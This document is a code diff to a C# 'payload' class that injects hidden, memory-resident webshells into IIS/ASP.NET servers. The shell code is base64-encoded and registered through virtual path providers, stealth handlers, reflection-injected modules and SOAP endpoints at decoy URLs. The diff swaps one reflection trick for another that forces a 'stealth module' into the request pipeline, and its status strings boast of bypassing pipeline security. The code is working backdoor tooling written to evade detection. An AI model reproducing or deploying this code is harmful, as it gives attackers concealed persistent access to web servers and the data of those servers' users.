@@ -41,8 +41,10 @@ public class payload
         {
             if (shellType.Equals("iis_virtualfile", StringComparison.OrdinalIgnoreCase))
             {
-                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/Index.aspx";
-                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;
+                if (string.IsNullOrEmpty(szUrlPattern))
+                    szUrlPattern = "/Index.aspx";
+                if (!szUrlPattern.StartsWith("/"))
+                    szUrlPattern = "/" + szUrlPattern;
 
                 MyPathProvider provider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                 HostingEnvironment.RegisterVirtualPathProvider(provider);
@@ -52,8 +54,10 @@ public class payload
             }
             else if (shellType.Equals("iis_handler", StringComparison.OrdinalIgnoreCase))
             {
-                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/WebResource.ashx";
-                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;
+                if (string.IsNullOrEmpty(szUrlPattern))
+                    szUrlPattern = "/WebResource.ashx";
+                if (!szUrlPattern.StartsWith("/"))
+                    szUrlPattern = "/" + szUrlPattern;
 
                 byte[] rawHandlerCodeBytes = Convert.FromBase64String(szWebShellBase64);
                 MyStealthHandler handlerInstance = new MyStealthHandler(rawHandlerCodeBytes);
@@ -71,52 +75,46 @@ public class payload
             }
             else if (shellType.Equals("iis_module", StringComparison.OrdinalIgnoreCase))
             {
-                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/core_init";
-                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;
+                if (string.IsNullOrEmpty(szUrlPattern))
+                    szUrlPattern = "/core_init";
+                if (!szUrlPattern.StartsWith("/"))
+                    szUrlPattern = "/" + szUrlPattern;
 
                 try
                 {
-                    Assembly infraAssembly = Assembly.Load("Microsoft.Web.Infrastructure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
-                    Type dynamicModuleType = infraAssembly.GetType("Microsoft.Web.Infrastructure.DynamicModuleHelper.DynamicModuleUtility");
-                    
-                    if (dynamicModuleType != null)
-                    {
-                        MethodInfo mRegister = dynamicModuleType.GetMethod("RegisterModule", BindingFlags.Static | BindingFlags.Public);
-                        if (mRegister != null)
-                        {
-                            mRegister.Invoke(null, new object[] { typeof(MyStealthModule) });
-                        }
-                    }
+                    HttpApplication app = currentContext.ApplicationInstance;
 
-                    currentContext.Application["stealth_matrix_route"] = szUrlPattern;
-                    return $"[+] SUCCESS: IIS Dynamic Matrix Module successfully chained via Infrastructure! Active Gate: [{szUrlPattern}] (Immune to 404)";
-                }
-                catch (Exception)
-                {
-                    try
+                    MyStealthModule stealthModule = new MyStealthModule();
+                    stealthModule.Init(app);
+
+                    FieldInfo runtimeModulesField = typeof(HttpApplication).GetField("_runtimeModules", BindingFlags.NonPublic | BindingFlags.Instance);
+                    if (runtimeModulesField != null)
                     {
-                        Type appFactoryType = typeof(HttpApplication).Assembly.GetType("System.Web.HttpApplicationFactory");
-                        if (appFactoryType != null)
+                        object runtimeModules = runtimeModulesField.GetValue(app);
+                        if (runtimeModules != null)
                         {
-                            FieldInfo fState = appFactoryType.GetField("_state", BindingFlags.NonPublic | BindingFlags.Static);
-                            if (fState != null)
+                            MethodInfo addMethod = runtimeModules.GetType().GetMethod("AddModule", BindingFlags.NonPublic | BindingFlags.Instance);
+                            if (addMethod != null)
                             {
-                                fState.SetValue(null, 0);
-                                HttpApplication.RegisterModule(typeof(MyStealthModule));
-                                fState.SetValue(null, 1);
+                                addMethod.Invoke(runtimeModules, new object[] { "DynamicStealthModule", stealthModule });
                             }
                         }
                     }
-                    catch { }
 
                     currentContext.Application["stealth_matrix_route"] = szUrlPattern;
-                    return $"[+] SUCCESS: Pipeline security bypassed. Module forced into core cache at [{szUrlPattern}]";
+                    return $"[+] SUCCESS: IIS Dynamic Module injected via Runtime Reflection! Route: [{szUrlPattern}]";
+                }
+                catch (Exception ex)
+                {
+                    return $"[-] INJECTION_FAILED: {ex.Message}";
                 }
             }
             else if (shellType.Equals("wcf_soap", StringComparison.OrdinalIgnoreCase))
             {
-                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/PulsarService.asmx";
-                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;
+                if (string.IsNullOrEmpty(szUrlPattern))
+                    szUrlPattern = "/PulsarService.asmx";
+                if (!szUrlPattern.StartsWith("/"))
+                    szUrlPattern = "/" + szUrlPattern;
 
                 byte[] rawSoapCodeBytes = Convert.FromBase64String(szWebShellBase64);
 
@@ -269,7 +267,7 @@ public class payload
         public void Dispose() { }
         public void Init(HttpApplication app)
         {
-            app.ResolveRequestCache += new EventHandler(OnBeginRequest);
+            app.BeginRequest += new EventHandler(OnBeginRequest);
         }
 
         private void OnBeginRequest(object sender, EventArgs e)
